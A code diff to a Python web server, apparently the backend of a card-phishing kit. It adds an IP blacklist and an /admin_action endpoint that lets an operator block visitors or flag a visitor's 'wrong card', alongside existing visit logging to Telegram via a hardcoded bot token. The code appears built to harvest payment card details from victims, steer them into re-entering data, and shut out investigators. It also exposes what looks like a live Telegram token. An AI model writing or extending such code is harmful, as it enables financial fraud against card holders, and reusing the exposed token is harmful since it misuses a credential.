@@ -68,6 +68,9 @@ COUNTRY_NAMES = {
 
 # --- In-memory storage for request_again flags ---
 REQUEST_AGAIN_FLAGS = {}
+# --- In-memory blacklist and wrong_card flags ---
+BLACKLISTED_IPS = set()
+WRONG_CARD_FLAGS = {}
 
 def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     BOT_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"  # токен з main.py
@@ -114,7 +117,17 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.send_header('Access-Control-Allow-Headers', 'Content-Type')
         super().end_headers()
     
+    def is_blocked(self):
+        ip = self.client_address[0]
+        return ip in BLACKLISTED_IPS
+
     def do_GET(self):
+        # --- Блокування IP ---
+        if self.is_blocked():
+            self.send_response(403)
+            self.end_headers()
+            self.wfile.write(b'<html><body><h2>Ваш IP заблоковано адміністратором.</h2></body></html>')
+            return
         print(f"GET: {self.path}")  # Логування всіх GET-запитів
         path = unquote(self.path.split('?', 1)[0])
         orig_path = path
@@ -226,6 +239,12 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
         path = unquote(self.path.split('?', 1)[0])
+        # --- Блокування IP ---
+        if self.is_blocked():
+            self.send_response(403)
+            self.end_headers()
+            self.wfile.write(b'BLOCKED')
+            return
         if path == '/log_visit':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length).decode('utf-8')
@@ -341,6 +360,31 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'false')
+            return
+        elif path == '/admin_action':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                action = data.get('action')
+                ip = data.get('ip')
+                if action == 'block' and ip:
+                    BLACKLISTED_IPS.add(ip)
+                    print(f'[admin_action] Blocked IP: {ip}')
+                elif action == 'unblock' and ip:
+                    BLACKLISTED_IPS.discard(ip)
+                    print(f'[admin_action] Unblocked IP: {ip}')
+                elif action == 'card' and ip:
+                    WRONG_CARD_FLAGS[ip] = True
+                    print(f'[admin_action] Wrong card for IP: {ip}')
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'ok')
+            except Exception as e:
+                print(f'[admin_action] Error: {e}')
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
             return
         else:
             self.send_response(404)
